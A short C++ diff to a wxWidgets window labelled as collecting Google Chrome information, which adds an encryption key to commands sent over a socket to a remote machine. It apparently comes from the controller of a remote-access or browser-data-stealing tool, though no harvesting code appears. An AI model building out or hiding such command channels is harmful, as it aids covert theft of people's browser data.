@@ -8,10 +8,11 @@ wxBEGIN_EVENT_TABLE(panelInfoChrome, wxFrame)
 	EVT_BUTTON(wxID_ANY, panelInfoChrome::OnProcesarBoton)
 wxEND_EVENT_TABLE()
 
-panelInfoChrome::panelInfoChrome(wxWindow* pParent, SOCKET sck_socket, wxString _title, std::string _strID)
+panelInfoChrome::panelInfoChrome(wxWindow* pParent, SOCKET sck_socket, wxString _title, std::string _strID, ByteArray c_key)
 	: wxFrame(pParent, EnumIDS::ID_Panel_Info, "Recoleccion de informacion [Google Chrome]") {
 	
 	this->sckSocket = sck_socket;
+	this->enc_key = c_key;
 	this->SetName(_strID + "-INF-CHROME");
 	this->SetTitle(_title + " [Google Chrome]");
 
@@ -109,7 +110,7 @@ void panelInfoChrome::OnProcesarBoton(wxCommandEvent& event) {
 	}
 	
 	if (iComando != 0 && strPaquete.size() > 1) {
-		p_Servidor->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, iComando);
+		p_Servidor->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, iComando, this->enc_key);
 	}else {
 		wxMessageBox("No se ha seleccionado un usuario", "Error", 5L, this);
 	}
